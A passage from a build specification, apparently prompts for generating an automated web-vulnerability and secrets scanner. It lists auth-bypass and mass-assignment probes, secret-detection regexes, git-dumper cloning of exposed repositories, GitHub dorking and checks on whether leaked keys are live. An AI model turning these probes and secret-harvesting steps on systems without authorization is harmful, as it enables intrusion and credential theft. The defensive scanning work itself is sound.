  expected_access: dict[str, dict[str, bool]]
    {endpoint: {role: should_be_accessible}}
  
  Example:
  {
    "/api/users": {
      "anonymous": False,
      "user": False,
      "admin": True
    },
    "/api/profile": {
      "anonymous": False,
      "user": True,
      "admin": True
    }
  }

AuthorizationTester class:

run(scan_id: str,
    context: ScanContext,
    db: AsyncSession) → async → list[AuthzFinding]

  STEP 1: Build test matrix
    Load API endpoints from DB (is_api == True)
    Load login endpoints (is_login == True)
    
    Build basic AuthMatrix:
      All API endpoints as endpoints
      Roles: ["anonymous"] only (no real auth tokens yet)
      Note: Future phase adds authenticated testing
            when auth tokens are captured during scan

  STEP 2: Run unauthenticated access tests
    For each API endpoint:
      Send GET request with no Authorization header
      Send GET with: Authorization: Bearer null
      Send GET with: Authorization: Bearer undefined
      Send GET with: Authorization: Bearer 0
      Send GET with: X-User-ID: 1 (IDOR probe)
      Send GET with: X-Admin: true (privilege escalation)
      
    Compare each response to baseline (expected 401/403)
    
    Unexpected 200 → CRITICAL finding:
      title = "Broken Access Control — Unauthenticated Access"
      owasp = "A01:2025"

  STEP 3: Test HTTP verb tampering for auth bypass
    For endpoints returning 403 to GET:
      Try: POST, PUT, HEAD, OPTIONS to same endpoint
      If any returns 200 → auth bypass via HTTP method
      Severity = HIGH, owasp = "A01:2025"

  STEP 4: Test path traversal auth bypass
    For each protected endpoint /api/admin/users:
      Test: /api/admin/../admin/users
      Test: /API/ADMIN/USERS (case)
      Test: /api/admin/users/ (trailing slash)
      Test: /api/admin/users%20
      Test: /api/v1/./admin/users
    
    If any bypass returns 200:
      Severity = HIGH, owasp = "A01:2025"

  STEP 5: Test mass assignment
    For each POST/PUT endpoint:
      Add extra fields to request body:
        is_admin: true
        role: "admin"
        user_id: 1
        admin: 1
      
      Check response for signs of acceptance:
        Response body contains "is_admin": true
        Response status code changes
      
      Severity = HIGH, owasp = "A06:2025"

  Return list[AuthzFinding]

AuthzFinding dataclass:
  (same fields as WebFinding)
  title, severity, owasp_category, affected_url,
  evidence, request_sent, response_received,
  tool_found_by = "authz_tester"

Generate authz_tester.py only. Stop after.
```

---

### Step 6.7 — Vuln Validator (claude-bug-bounty extraction)

```
PHASE 6 — STEP 7

Generate: backend/workers/processors/vuln_validator.py

This class implements the validation methodology
extracted from claude-bug-bounty repo.

Reference: tools/claude-bug-bounty/ for:
  - 7-Question Gate logic
  - 4 validation gates
  - False positive detection patterns
  - Bug chaining detection logic

Rewrite ALL of it as Python classes. Do not import
from tools/.

ValidationResult dataclass:
  finding: dict
  is_valid: bool
  confidence: float (0.0-1.0)
  false_positive_reason: str | None
  validation_notes: str
  chain_potential: list[str]
    (other finding types this could chain with)

VulnValidator class:

validate_all(findings: list[dict]) → async → list[ValidationResult]
  Runs validate_single on each finding
  Filters out confirmed false positives
  Runs chain_detector on remaining findings
  Returns validated + enriched findings

validate_single(finding: dict) → ValidationResult:
  Run all 4 validation gates:
    gate1 = _gate_reproducibility(finding)
    gate2 = _gate_impact(finding)
    gate3 = _gate_evidence_quality(finding)
    gate4 = _gate_false_positive_check(finding)
  
  confidence = average of all gate scores
  is_valid = all gates pass AND confidence > 0.5

_gate_reproducibility(finding) → float (0.0-1.0):
  Has request evidence? +0.3
  Has response evidence? +0.3
  Has affected_url? +0.2
  Has affected_parameter? +0.2
  Return sum (max 1.0)

_gate_impact(finding) → float:
  CRITICAL severity → 1.0 (always passes)
  HIGH → 0.8
  MEDIUM → 0.6
  LOW → 0.4
  INFO → 0.2

_gate_evidence_quality(finding) → float:
  response contains actual sensitive data? +0.4
  request shows actual payload? +0.3
  evidence length > 50 chars? +0.2
  tool confidence > 0.7? +0.1

_gate_false_positive_check(finding) → float:
  Known false positive patterns (return 0.0 if matched):
  
  Pattern 1: Nuclei "info" severity + no CVE
    → likely informational, not a vulnerability
    → score = 0.3 (don't filter, just low confidence)
  
  Pattern 2: Missing security header on non-sensitive page
    → /favicon.ico, /robots.txt, /sitemap.xml
    → score = 0.1 (likely FP)
  
  Pattern 3: SQLi finding with no parameter in URL
    → score = 0.2 (SQLMap sometimes reports FP)
  
  Pattern 4: XSS in a parameter that's not reflected
    in response
    → score = 0.1 (definite FP)
  
  Pattern 5: Rate limiting "finding" on endpoint
    that returned 429 after 30 requests
    → score = 0.0 (rate limiting IS working, not a vuln)
  
  If none matched → score = 1.0 (not a known FP)

detect_chains(findings: list[ValidationResult]) → list:
  Implement A→B→C bug chaining from claude-bug-bounty:
  
  Chain 1: XSS + Session Cookie No HttpOnly
    → XSS can steal session cookies
    → chain_severity = CRITICAL (escalated)
    → chain_title = "XSS → Session Hijacking Chain"
  
  Chain 2: Open Redirect + OAuth
    → Open redirect can steal OAuth tokens
    → chain_severity = HIGH
    → chain_title = "Open Redirect → OAuth Token Theft"
  
  Chain 3: SSRF + Cloud Metadata
    → SSRF can reach 169.254.169.254
    → chain_severity = CRITICAL
    → chain_title = "SSRF → Cloud Metadata Access"
  
  Chain 4: SQLi + Weak Auth
    → SQLi can bypass login + extract data
    → chain_severity = CRITICAL
    → chain_title = "SQLi → Authentication Bypass Chain"
  
  Chain 5: Subdomain Takeover + Stored XSS
    → Takeover enables XSS on trusted origin
    → chain_severity = CRITICAL
  
  For each chain detected:
    Create a new ChainFinding and add to findings list
    ChainFinding includes both individual findings
    as components

7_question_gate(finding) → bool:
  (Adapted from claude-bug-bounty validation gate)
  
  Q1: Is the vulnerability reproducible? 
      (has request + response evidence) → True/False
  Q2: Is there a real security impact?
      (severity >= MEDIUM) → True/False
  Q3: Is the affected component in scope?
      (affected_url contains target domain) → True/False
  Q4: Is this a known false positive pattern?
      (_gate_false_positive_check score > 0.5) → True/False
  Q5: Does evidence prove the vulnerability?
      (not just a potential) → True/False
  Q6: Has this been deduplicated?
      (not same title + same URL already in list) → True/False
  Q7: Is severity correctly assigned?
      (CVSS score aligns with severity enum) → True/False
  
  Return True only if all 7 pass.
  Log which gate failed for debugging.

Generate vuln_validator.py only. Stop after.
```

---

### Step 6.8 — Finding Processor + OWASP Mapper

```
PHASE 6 — STEP 8

Generate these 2 files:
backend/workers/processors/finding_processor.py
backend/reports/owasp_mapper.py

─────────────────────────────────────────

finding_processor.py:

FindingProcessor class:

process_all(scan_id: str,
            validated_results: list[ValidationResult],
            db: AsyncSession) → async → int

  For each ValidationResult:
    if not is_valid: skip
    
    finding_data = result.finding
    
    Enrich with OWASP mapper:
      owasp_info = owasp_mapper.map(finding_data)
    
    Create Finding record:
      title = finding_data.title
      description = finding_data.description
      severity = Severity[finding_data.severity]
      cvss_score = finding_data.cvss_score
      ai_severity_score = result.confidence * 10
      ai_confidence = result.confidence
      cve_id = finding_data.cve_id
      cwe_id = owasp_info.cwe_id
      owasp_category = owasp_info.owasp_category
      mitre_technique = owasp_info.mitre_technique (optional)
      affected_url = finding_data.affected_url
      affected_parameter = finding_data.affected_parameter
      evidence = finding_data.evidence
      request = finding_data.request
      response = finding_data.response[:1000] (truncate)
      is_false_positive = False
      is_confirmed = result.confidence > 0.8
      tool_found_by = finding_data.tool_found_by
      status = FindingStatus.NEW
      scan_id = scan_id
      
      Find related subdomain:
        Match affected_url to Subdomain.name
        Set subdomain_id if match found
      
      Find related endpoint:
        Match affected_url to Endpoint.url
        Set endpoint_id if match found
    
    Bulk insert in batches of 50
    Commit after each batch
  
  Return count of inserted findings

deduplicate_before_insert(findings, scan_id, db) → async:
  Before inserting each finding:
    Check if Finding with same (title, affected_url, scan_id) exists
    If exists: skip insert (already found by another tool)
  This prevents double-counting same vuln from Nuclei + SQLMap

─────────────────────────────────────────

owasp_mapper.py:

OWASPMapping dataclass:
  owasp_category: str
  owasp_name: str
  cwe_id: str | None
  mitre_technique: str | None

OWASPMapper class:

map(finding: dict) → OWASPMapping

  MAPPING TABLE (rule-based, no ML):
  
  Match by title keywords first:
  
  "SQL Injection" / "SQLi"
    → A05:2025, CWE-89, T1190
  
  "XSS" / "Cross-Site Scripting"
    → A05:2025, CWE-79, T1059.007
  
  "SSRF" / "Server-Side Request Forgery"
    → A01:2025, CWE-918, T1090
  
  "XXE" / "XML External Entity"
    → A05:2025, CWE-611, T1190
  
  "LFI" / "Local File Inclusion"
    → A05:2025, CWE-22, T1083
  
  "SSTI" / "Template Injection"
    → A05:2025, CWE-94, T1190
  
  "Command Injection"
    → A05:2025, CWE-78, T1059
  
  "Path Traversal" / "Directory Traversal"
    → A05:2025, CWE-22, T1083
  
  "CORS Misconfiguration"
    → A02:2025, CWE-942, None
  
  "CSRF" / "Cross-Site Request Forgery"
    → A01:2025, CWE-352, None
  
  "JWT Misconfiguration"
    → A07:2025, CWE-347, T1528
  
  "Authentication Bypass"
    → A07:2025, CWE-287, T1078
  
  "Open Redirect"
    → A01:2025, CWE-601, T1566
  
  "Clickjacking"
    → A02:2025, CWE-1021, None
  
  "Missing Security Headers"
    → A02:2025, CWE-693, None
  
  "Exposed .git"
    → A02:2025, CWE-538, T1213
  
  "Default Credentials"
    → A07:2025, CWE-521, T1078.001
  
  "Subdomain Takeover"
    → A02:2025, CWE-923, T1584
  
  "AWS" / "S3 Bucket" / "Cloud"
    → A02:2025, CWE-732, T1530
  
  "Broken Access Control" / "IDOR" / "BOLA"
    → A01:2025, CWE-639, T1078
  
  "API Key Exposed"
    → A02:2025, CWE-312, T1552
  
  "Rate Limit"
    → A07:2025, CWE-770, None
  
  "CVE-" prefix in title:
    → Map severity from CVSS score
    → A category from CVE description keywords
  
  Default fallback:
    → A02:2025 (Security Misconfiguration)
    CWE = None

  Also provide:
  get_owasp_description(category: str) → str
    Returns full OWASP Top 10 2025 description
    for the category (for report generation)

Generate both files. Stop after.
```

---

### Step 6.9 — Phase 6 Verification

```
PHASE 6 — STEP 9 — FINAL VERIFICATION

Phase 6 complete. Write tests/test_vuln_agent.py

Test cases:

1. test_decision_engine_activates_wpscan
   ScanContext with has_wordpress=True
   Assert: wpscan_plugin in decided vuln tools

2. test_nuclei_module_deduplicates
   Feed 3 nuclei findings, 2 with same template+url
   Assert: only 2 findings returned (1 deduplicated)

3. test_sqli_fallback_to_nuclei
   Mock sqlmap to fail
   Assert: nuclei_plugin called with sqli templates
   Assert: vuln scan continues (no crash)

4. test_cors_severity_with_credentials
   CORS finding with wildcard + credentials=true
   Assert: severity == HIGH

5. test_jwt_alg_none_severity
   jwt_tool finds alg:none vulnerability
   Assert: severity == CRITICAL

6. test_rate_limit_finding_not_fp
   Rate limit test returns 429 after 30 requests
   Assert: NO finding created (rate limit working)

7. test_vuln_validator_xss_fp_detection
   XSS finding where response doesn't reflect param
   Assert: is_valid == False
   Assert: false_positive_reason is not None

8. test_vuln_validator_chain_detection
   Findings list has both XSS and Session Cookie insecure
   Assert: chain detected with title containing "Session Hijacking"
   Assert: chain severity == CRITICAL

9. test_7_question_gate_fails_no_evidence
   Finding with no request, no response, no evidence
   Assert: 7_question_gate returns False
   Assert: not inserted to DB

10. test_owasp_mapper_sqli
    Finding title "SQL Injection in login parameter"
    Assert: owasp_category == "A05:2025"
    Assert: cwe_id == "CWE-89"

11. test_finding_processor_deduplication
    Same (title, affected_url, scan_id) finding from
    2 different tools
    Assert: only 1 Finding record in DB

12. test_authz_tester_method_bypass
    Endpoint returns 403 to GET
    Mock PUT to same endpoint returns 200
    Assert: Finding created with title containing
    "HTTP Method" and severity HIGH

13. test_bola_detection
    API endpoint /api/users/1 returns 200
    /api/users/2 returns 200 (different data)
    Assert: IDOR/BOLA finding created
    Assert: owasp == "A01:2025"

14. test_vuln_agent_parallel_with_secrets
    Redis flag agentsec:secrets_complete:{scan_id} NOT set
    Vuln agent completes, sets vuln_complete flag
    Assert: VulnScanCompleteEvent fired
    Assert: report NOT dispatched yet (waiting for secrets)

15. test_risk_score_calculation
    3 critical + 2 high + 5 medium findings
    Expected risk score = (3×10) + (2×5) + (5×2) = 50.0
    Assert: Scan.risk_score == 50.0

Run: pytest tests/test_vuln_agent.py -v
All 15 must pass.
Phase 6 only complete when all 15 tests pass.

Final integration test on legal target:
  docker compose exec backend python -c "
  from backend.workers.vuln_agent import start_vuln
  # Use context from Phase 4-5 integration test
  result = start_vuln.delay(
    scan_id='test-001',
    context_dict={...}  # from previous phase output
  )
  print(result.get(timeout=300))
  "
Expected: dict with finding_count >= 0
Zero findings is valid (scanme.nmap.org is hardened).
```

---

## Phase Summary

| Phase | Steps | Key Output | Verify At |
|---|---|---|---|
| Phase 5 | 5.1 → 5.9 | Enum Agent, 6 coordinators, ScanContext Builder | Step 5.9 only |
| Phase 6 | 6.1 → 6.9 | Vuln Agent, 5 test modules, Validator, OWASP Mapper | Step 6.9 only |

**Repo extraction rule: Read from `tools/`. Rewrite in `backend/`. Never import from `tools/` in production code.**

**Test target rule: Only use `scanme.nmap.org` for live integration tests. Zero findings is a valid result.**

# PHASE 7 — SECRET & CLOUD AGENT

---

### Step 7.0 — Phase 7 Master Context

```
PHASE 7 — SECRET & CLOUD AGENT

Phases 0-6 complete. Vuln Agent working.
Now building the Secret & Cloud Agent.

CRITICAL ARCHITECTURE POINT:
This agent runs IN PARALLEL with Phase 6 (Vuln Agent).
Both are dispatched simultaneously by the Orchestrator
after enum_complete event fires.
They do NOT wait for each other.
The Orchestrator waits for BOTH to complete before
dispatching the Reporting Agent.

This agent covers:
  A. JavaScript Secret Extraction
     (API keys, tokens, credentials in JS files)
  B. GitHub / Git Repository Secret Scanning
     (TruffleHog + Gitleaks on discovered repos)
  C. File-based Secret Scanning
     (config files, backup files found in Phase 5)
  D. Cloud Infrastructure Detection
     (S3, Azure Blob, GCP buckets)
  E. Cloud Metadata & Misconfiguration
     (public buckets, open storage, SSRF to metadata)
  F. AI-powered OSINT enrichment
     (ScrapeGraphAI for deep target intelligence)

Extraction from cloned repos for this phase:

  BCHackTool:
    Reference its TruffleHog + Gitleaks invocation
    Copy its notification trigger logic
    (when critical secret found → notify immediately)
    Rewrite as Python async methods

  Session-Hijacking-Visual-Exploitation (SHVE):
    Reference its JavaScript analysis approach
    for finding injection points and secrets
    Extract its JS file fetching logic
    Rewrite as JSAnalyzer class

  claude-bug-bounty:
    Extract its secret validation methodology:
      How to verify if an API key is actually active
      AWS key validation approach
      Google API key scope checker
    Rewrite as SecretValidator class

Architecture rules:
  - Secrets Agent subscribes to enum_complete event
  - Reads JS file list from Redis:
      Key: agentsec:jsfiles:{scan_id}
      (written by CrawlerCoordinator in Phase 5)
  - Reads discovered repos from DB
  - Reads config/backup file findings from DB
  - ALL secret findings go through SecretValidator
    before DB insert (verify if key is live/active)
  - CRITICAL secrets trigger IMMEDIATE notification
    (do not wait for report phase)
  - Sets Redis flag on completion:
      agentsec:secrets_complete:{scan_id}

Token rule:
Generate in order, wait for "next" between each:
  Step 7.1: Secrets Agent Task (main Celery task)
  Step 7.2: JS Secret Extractor
  Step 7.3: Git Secret Scanner
  Step 7.4: File Secret Scanner
  Step 7.5: Secret Validator
  Step 7.6: Cloud Security Module
  Step 7.7: OSINT Enricher (ScrapeGraphAI)
  Step 7.8: Immediate Notifier
  Step 7.9: Verification
```

---

### Step 7.1 — Secrets Agent Task

```
PHASE 7 — STEP 1

Generate: backend/workers/secret_agent.py

Task: secrets.start

@celery_app.task(
  bind=True,
  name="secrets.start",
  queue="secrets_queue",
  max_retries=1,
  soft_time_limit=3600,
  time_limit=4000
)
def start_secrets(self, scan_id: str,
                  context_dict: dict) → dict:
  return asyncio.run(_async_start_secrets(
    self, scan_id, context_dict
  ))

Async implementation _async_start_secrets():

STEP 1: Initialize
  Load ScanContext from context_dict
  Also load from Redis backup:
    agentsec:context:{scan_id}
  Get DB session, EventBus, PluginExecutor
  
  Update Scan:
    current_phase = "Secret & Cloud Analysis"
    current_tool = "Initializing"
  
  Log: "Secret & Cloud Agent started for {scan_id}"
  
  Initialize result collectors:
    all_secret_findings = []
    all_cloud_findings = []

STEP 2: Load file targets from previous phases
  
  Load JS files list:
    Redis key: agentsec:jsfiles:{scan_id}
    If not in Redis: query Endpoint table where
      is_js_file == True for this scan_id
    Write to: /tmp/agentsec_{scan_id}_jsfiles.txt
  
  Load config/backup files:
    Query Finding table where:
      tool_found_by in ["ffuf", "feroxbuster", "nuclei"]
      AND title contains any of:
        "Backup File", "Config File", "Exposed .env",
        "Exposed .git", "Source Map"
    Extract affected_url from each finding
    Write to: /tmp/agentsec_{scan_id}_sensitive_files.txt
  
  Load GitHub references:
    Query Endpoint table where:
      url contains "github.com"
    Extract repo URLs

STEP 3: Run JS secret extraction
  Publish ToolStartedEvent("secretfinder")
  Update Scan.current_tool = "JS Secret Extraction"
  
  js_extractor = JSSecretExtractor(executor, event_bus, db)
  js_findings = await js_extractor.run(
    scan_id=scan_id,
    js_file_list=js_files,
    context=context
  )
  all_secret_findings.extend(js_findings)
  
  Publish WebSocket update:
    {step: "js_secrets", found: len(js_findings)}

STEP 4: Run git/repo secret scanning
  git_scanner = GitSecretScanner(executor, event_bus, db)
  git_findings = await git_scanner.run(
    scan_id=scan_id,
    repo_urls=github_refs,
    target=context.target
  )
  all_secret_findings.extend(git_findings)
  
  Update Scan.current_tool = "Git Secret Scanner"
  Publish WebSocket update

STEP 5: Run file-based secret scanning
  file_scanner = FileSecretScanner(executor, event_bus, db)
  file_findings = await file_scanner.run(
    scan_id=scan_id,
    sensitive_files=sensitive_file_urls
  )
  all_secret_findings.extend(file_findings)

STEP 6: Run cloud security checks (parallel with secrets)
  cloud_module = CloudSecurityModule(executor, event_bus, db)
  cloud_findings = await cloud_module.run(
    scan_id=scan_id,
    context=context
  )
  all_cloud_findings.extend(cloud_findings)
  
  Update Scan.current_tool = "Cloud Security Analysis"
  Publish WebSocket update

STEP 7: Run OSINT enrichment
  osint = OSINTEnricher(event_bus, db)
  osint_data = await osint.run(
    scan_id=scan_id,
    context=context
  )
  (OSINT data stored directly by enricher,
   not added to secret_findings)

STEP 8: Validate all secret findings
  validator = SecretValidator()
  validated_secrets = await validator.validate_all(
    all_secret_findings,
    scan_id=scan_id
  )
  
  Log: f"{len(validated_secrets)} secrets validated"

STEP 9: Store all findings to DB
  all_findings = validated_secrets + all_cloud_findings
  
  For each finding:
    Create Finding record:
      severity = CRITICAL for verified active secrets
      severity = HIGH for unverified secrets
      severity = HIGH for public cloud buckets
      owasp_category = "A02:2025" for most secrets
    
  Bulk insert, batch 50, commit each batch

STEP 10: Trigger immediate notifications
  critical_findings = [f for f where severity==CRITICAL
                       AND is_confirmed==True]
  
  If critical_findings:
    notifier = ImmediateNotifier()
    await notifier.notify_critical(
      scan_id=scan_id,
      findings=critical_findings,
      target=context.target
    )

STEP 11: Update scan stats + fire completion event
  secret_count = len(validated_secrets)
  cloud_count = len(all_cloud_findings)
  
  Update Scan:
    total_findings += (secret_count + cloud_count)
  
  Set Redis flag:
    agentsec:secrets_complete:{scan_id} = "1"
    TTL = 86400
  
  Publish SecretsCompleteEvent(
    scan_id=scan_id,
    secret_count=secret_count,
    cloud_exposure_count=cloud_count
  )
  
  Log: "Secrets Agent complete. {secret_count} secrets,
        {cloud_count} cloud exposures found."

STEP 12: Cleanup
  Delete all temp files: /tmp/agentsec_{scan_id}_*
  Return summary dict:
    {scan_id, secret_count, cloud_count,
     critical_confirmed, tools_run, execution_time}

Generate secret_agent.py only. Stop after.
```

---

### Step 7.2 — JS Secret Extractor

```
PHASE 7 — STEP 2

Generate: backend/workers/modules/js_secret_extractor.py

Extraction from SHVE repo:
  Reference tools/Session-Hijacking-Visual-Exploitation/
  for its JavaScript file fetching and analysis approach.
  Rewrite as clean async Python class.
  Do NOT import from tools/.

JSSecretExtractor class:

run(scan_id: str,
    js_file_list: list[str],
    context: ScanContext,
    db: AsyncSession) → async → list[SecretFinding]

  all_findings = []
  
  STEP 1: Fetch all JS file contents
    For each JS URL in js_file_list:
      Fetch content via httpx AsyncClient:
        timeout = 15s
        headers = {User-Agent: random agent}
        follow_redirects = True
      
      If fetch fails: log warning, skip
      If content > 5MB: skip (too large, likely minified bundle)
      
      Save to: /tmp/agentsec_{scan_id}_js/
      Use MD5 of URL as filename
    
    Deduplicate by content hash:
      Two different URLs serving identical JS → keep one

  STEP 2: Run SecretFinder on each JS file
    For each downloaded JS file:
      Run secretfinder_plugin with:
        js_url = original URL
        (secretfinder fetches it itself, or
         pass downloaded content via stdin)
      Collect findings

  STEP 3: Run custom regex extraction
    ALSO run our own regex engine on each JS file
    (redundancy — SecretFinder misses some patterns)
    
    Call _regex_extract(content, source_url) for each file
    Add results to all_findings

  STEP 4: Run LinkFinder for endpoint discovery
    Run linkfinder_plugin on each JS file
    Newly discovered endpoints:
      Create Endpoint records if not already in DB
      Flag: source = "linkfinder"
    
    Check discovered endpoints for:
      /admin paths → create Finding (Admin Panel)
      /internal → create Finding (Internal Endpoint)
      Hardcoded URLs with credentials in them:
        https://user:password@host → CRITICAL

  STEP 5: Analyze source maps
    For each JS file URL, also try:
      {url}.map (appending .map extension)
    
    If .map file exists and accessible:
      Create Finding:
        title = "JavaScript Source Map Exposed"
        severity = HIGH
        evidence = "Source map URL: {url}.map"
        owasp = "A02:2025"
      
      Parse source map to extract:
        Original file names (may reveal stack/framework)
        Original source code snippets
        Run _regex_extract on source map content too

_regex_extract(content: str,
               source_url: str) → list[SecretFinding]:

  SECRET_PATTERNS dict — all patterns below:
  
  {
    "aws_access_key": {
      "pattern": r"AKIA[0-9A-Z]{16}",
      "severity": "CRITICAL",
      "title": "AWS Access Key ID Exposed"
    },
    "aws_secret_key": {
      "pattern": r"[0-9a-zA-Z/+]{40}",
      "context_required": "aws_access_key nearby",
      "severity": "CRITICAL",
      "title": "AWS Secret Access Key Exposed"
    },
    "google_api_key": {
      "pattern": r"AIza[0-9A-Za-z\-_]{35}",
      "severity": "HIGH",
      "title": "Google API Key Exposed"
    },
    "firebase_url": {
      "pattern": r"https://[a-z0-9-]+\.firebaseio\.com",
      "severity": "HIGH",
      "title": "Firebase Database URL Exposed"
    },
    "firebase_key": {
      "pattern": r"AAAA[A-Za-z0-9_-]{7}:[A-Za-z0-9_-]{140}",
      "severity": "HIGH",
      "title": "Firebase Server Key Exposed"
    },
    "azure_conn_string": {
      "pattern": r"DefaultEndpointsProtocol=https;AccountName=[^;]+;AccountKey=[A-Za-z0-9+/=]{88}",
      "severity": "CRITICAL",
      "title": "Azure Storage Connection String Exposed"
    },
    "azure_client_secret": {
      "pattern": r"[a-zA-Z0-9~_.-]{34}",
      "context_required": "client_secret nearby",
      "severity": "HIGH",
      "title": "Azure Client Secret Exposed"
    },
    "github_token": {
      "pattern": r"gh[pousr]_[A-Za-z0-9_]{36,255}",
      "severity": "CRITICAL",
      "title": "GitHub Token Exposed"
    },
    "slack_token": {
      "pattern": r"xox[baprs]-[0-9]{12}-[0-9]{12}-[a-zA-Z0-9]{24}",
      "severity": "HIGH",
      "title": "Slack Token Exposed"
    },
    "slack_webhook": {
      "pattern": r"https://hooks\.slack\.com/services/T[a-zA-Z0-9_]+/B[a-zA-Z0-9_]+/[a-zA-Z0-9_]+",
      "severity": "HIGH",
      "title": "Slack Webhook URL Exposed"
    },
    "discord_webhook": {
      "pattern": r"https://discord(?:app)?\.com/api/webhooks/[0-9]+/[A-Za-z0-9_-]+",
      "severity": "MEDIUM",
      "title": "Discord Webhook Exposed"
    },
    "telegram_bot_token": {
      "pattern": r"[0-9]{8,10}:[a-zA-Z0-9_-]{35}",
      "severity": "HIGH",
      "title": "Telegram Bot Token Exposed"
    },
    "jwt_token": {
      "pattern": r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+",
      "severity": "HIGH",
      "title": "JWT Token Hardcoded"
    },
    "private_key": {
      "pattern": r"-----BEGIN (RSA|EC|DSA|OPENSSH) PRIVATE KEY-----",
      "severity": "CRITICAL",
      "title": "Private Key Exposed"
    },
    "generic_api_key": {
      "pattern": r"(?i)(api[_-]?key|apikey|api[_-]?secret)['\"\s:=]+([A-Za-z0-9_\-]{20,})",
      "severity": "HIGH",
      "title": "Generic API Key Exposed"
    },
    "generic_password": {
      "pattern": r"(?i)(password|passwd|pwd)['\"\s:=]+([A-Za-z0-9@#$%^&*!_\-]{8,})",
      "severity": "HIGH",
      "title": "Hardcoded Password Found"
    },
    "generic_secret": {
      "pattern": r"(?i)(secret|token)['\"\s:=]+([A-Za-z0-9_\-]{20,})",
      "severity": "MEDIUM",
      "title": "Hardcoded Secret Found"
    },
    "internal_ip": {
      "pattern": r"(?:10\.|172\.(?:1[6-9]|2[0-9]|3[01])\.|192\.168\.)[0-9]{1,3}\.[0-9]{1,3}",
      "severity": "LOW",
      "title": "Internal IP Address Exposed in JS"
    },
    "basic_auth_url": {
      "pattern": r"https?://[^:]+:[^@]+@[^\s/]+",
      "severity": "CRITICAL",
      "title": "Credentials in URL"
    },
    "sendgrid_key": {
      "pattern": r"SG\.[a-zA-Z0-9_-]{22}\.[a-zA-Z0-9_-]{43}",
      "severity": "HIGH",
      "title": "SendGrid API Key Exposed"
    },
    "stripe_key": {
      "pattern": r"(?:sk|pk)_(?:live|test)_[0-9a-zA-Z]{24,}",
      "severity": "CRITICAL",
      "title": "Stripe API Key Exposed"
    },
    "paypal_secret": {
      "pattern": r"access_token\$production\$[0-9a-z]{16}\$[0-9a-f]{32}",
      "severity": "CRITICAL",
      "title": "PayPal Access Token Exposed"
    },
    "twilio_key": {
      "pattern": r"SK[a-z0-9]{32}",
      "severity": "HIGH",
      "title": "Twilio API Key Exposed"
    },
    "mailchimp_key": {
      "pattern": r"[0-9a-f]{32}-us[0-9]{1,2}",
      "severity": "HIGH",
      "title": "Mailchimp API Key Exposed"
    }
  }
  
  For each pattern:
    Find all matches in content
    For each match:
      Extract 100 chars of context around match
      Create SecretFinding:
        secret_type = pattern key
        title = pattern title
        severity = pattern severity
        raw_match = match[:4] + "..." (truncated, never log full)
        context_snippet = surrounding context (sanitized)
        source_url = js file URL
        line_number = calculate from content
        tool_found_by = "regex_extractor"
  
  Remove duplicates by (secret_type, raw_match[:8])
  Return list[SecretFinding]

SecretFinding dataclass:
  secret_type: str
  title: str
  severity: str
  raw_match: str (ALWAYS truncated to first 8 chars + "...")
  context_snippet: str
  source_url: str
  line_number: int | None
  tool_found_by: str
  is_verified: bool = False
  verification_result: str | None = None

Generate js_secret_extractor.py only. Stop after.
```

---

### Step 7.3 — Git Secret Scanner

```
PHASE 7 — STEP 3

Generate: backend/workers/modules/git_secret_scanner.py

GitSecretScanner class:

run(scan_id: str,
    repo_urls: list[str],
    target: str,
    db: AsyncSession) → async → list[SecretFinding]

  all_findings = []

  STEP 1: Scan discovered GitHub repositories
    For each repo_url in repo_urls:
      await _scan_github_repo(repo_url)

  STEP 2: Scan target domain git history
    Try to find git repos via common paths:
      {target}/.git/
      {target}/.git/config
    
    If .git accessible:
      Run git_dumper to clone the repo:
        ["git-dumper", target_url,
         f"/tmp/agentsec_{scan_id}_gitdump"]
      
      Run TruffleHog on dumped directory:
        Run trufflehog_plugin with:
          mode = "filesystem"
          path = dump directory
      
      Run Gitleaks on dumped directory:
        Run gitleaks_plugin with:
          path = dump directory
          no-git = True
      
      Merge results, deduplicate

  STEP 3: Scan for GitHub dorks
    Search GitHub for:
      "{target}" password
      "{target}" api_key
      "{target}" secret
      "{target_domain}" .env
    
    Use GitHub search API:
      GET https://api.github.com/search/code
        ?q={target}+password
        &type=code
      Header: Authorization: token {GITHUB_TOKEN}
    
    If GITHUB_TOKEN not set:
      Skip this step, log warning:
      "GITHUB_TOKEN not configured — skipping GitHub dork search"
    
    For each result:
      Fetch raw file content
      Run _regex_extract on content
      Add source = "github_dork"

  STEP 4: Run TruffleHog on target's public repos
    If target is an org (has GitHub presence):
      Run trufflehog_plugin with mode="github"
      Pass org name extracted from target domain
    
    TruffleHog scans:
      All public repos in the org
      All commit history
      Returns only VERIFIED secrets by default

_scan_github_repo(repo_url) → async → list[SecretFinding]:
  Extract org/repo from URL
  
  Run TruffleHog on repo:
    trufflehog_plugin with:
      mode = "github"
      source = repo_url
  
  Run Gitleaks on repo:
    gitleaks detect on cloned copy
    (clone to /tmp/agentsec_{scan_id}_repos/{repo_name})
  
  Merge and deduplicate by (secret_type, raw_match[:8])
  
  Cleanup: remove cloned repo directory after scan
  Return findings

_scan_exposed_git(target_url, scan_id) → async:
  Fetch: GET {target_url}/.git/config
  If status 200:
    Content reveals remote origin URL
    Try to extract more files:
      /.git/HEAD
      /.git/COMMIT_EDITMSG
      /.git/logs/HEAD (commit history)
    
    If git-dumper available:
      Clone full repo to temp directory
      Run full TruffleHog + Gitleaks scan
    
    Create finding regardless:
      title = "Exposed .git Repository"
      severity = CRITICAL
      evidence = config file content (first 200 chars)
      owasp = "A02:2025"

Generate git_secret_scanner.py only. Stop after.
```

---

### Step 7.4 — File Secret Scanner

```
PHASE 7 — STEP 4

Generate: backend/workers/modules/file_secret_scanner.py

FileSecretScanner class:

run(scan_id: str,
    sensitive_file_urls: list[str],
    db: AsyncSession) → async → list[SecretFinding]

  STEP 1: Fetch and analyze each sensitive file
    For each URL in sensitive_file_urls:
      file_type = detect_file_type(url)
      await _analyze_file(url, file_type, scan_id)

  STEP 2: Download and scan backup files
    Filter URLs ending with:
      .bak, .old, .zip, .tar.gz, .sql, .dump,
      .backup, .copy, .swp, .orig
    
    For each backup file:
      Try to fetch (HEAD request first to check size)
      If size < 10MB: download
      If size >= 10MB: skip, log warning
      
      If downloaded:
        Save to /tmp/agentsec_{scan_id}_files/
        Run _analyze_file on it
        
        For .zip/.tar.gz:
          Extract to temp directory
          Scan all extracted files
          Cleanup after

  STEP 3: Analyze environment files
    Filter URLs matching:
      .env, .env.local, .env.production,
      .env.staging, .env.backup,
      config.php, database.yml, settings.py,
      wp-config.php, application.yml,
      config.json, secrets.json,
      credentials.json, serviceAccountKey.json
    
